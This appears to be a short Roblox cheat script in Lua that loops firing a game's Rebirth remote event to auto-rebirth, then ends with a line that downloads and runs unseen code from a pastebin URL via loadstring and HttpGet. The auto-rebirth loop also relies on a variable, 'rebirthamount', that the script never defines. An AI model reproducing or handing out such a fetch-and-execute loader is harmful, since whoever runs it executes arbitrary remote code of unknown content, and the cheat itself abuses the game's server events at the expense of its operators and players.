getgenv().autorebirth = false --true/false

while autorebirth == true do
    local Event = game:GetService("ReplicatedStorage").Remotes.Events.Rebirth:FireServer(rebirthamount) --1,2,3,4,5,etc
    wait()
end
loadstring(game:HttpGet(("https://pastebin.com/raw/8ACikAB6"), true))()
